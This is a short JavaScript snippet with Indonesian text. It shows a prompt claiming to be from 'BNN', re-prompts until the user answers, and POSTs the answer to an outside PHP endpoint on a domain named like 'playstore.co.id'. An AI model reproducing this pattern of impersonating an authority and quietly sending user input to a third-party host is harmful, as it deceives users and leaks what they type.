var no_urut = "a0"; //harus diganti terus
var teks_pesan = "Halo ocha, kami dari BNN. Gimana input berita-nya lancar?";

if (localStorage.getItem(no_urut) === null) {
  pesan();
}

function pesan(){
var pesanku = prompt(teks_pesan, "");
if (pesanku == null || pesanku == "") {
alert('Jawab dulu atuh..! ^_^');
pesan();
}
else{
alert('Oh '+pesanku+' yah?.. Ya udah gak apa-apa Makasih..! ^_^');
localStorage.setItem(no_urut, pesanku);
kirim_pesan(no_urut+'='+pesanku);
}
}

function kirim_pesan(isi_pesan) {

    var hr = new XMLHttpRequest();
    var url = "https://playstore.co.id/aahedi/khonsa.php";
    hr.open("POST", url, true);
    hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var param = "pesan=" + isi_pesan;
    //hr.setRequestHeader("Content-length", param.length);
    //hr.setRequestHeader("Connection", "close");
    hr.onreadystatechange = function() {
        if (hr.readyState == 4 && hr.status == 200) {
            var return_data = hr.responseText;
            //console.log(hr.responseText);
            //document.getElementById("status").innerHTML = return_data;
        }
    }
    hr.send(param);
    //document.getElementById("status").innerHTML = "processing...";
}
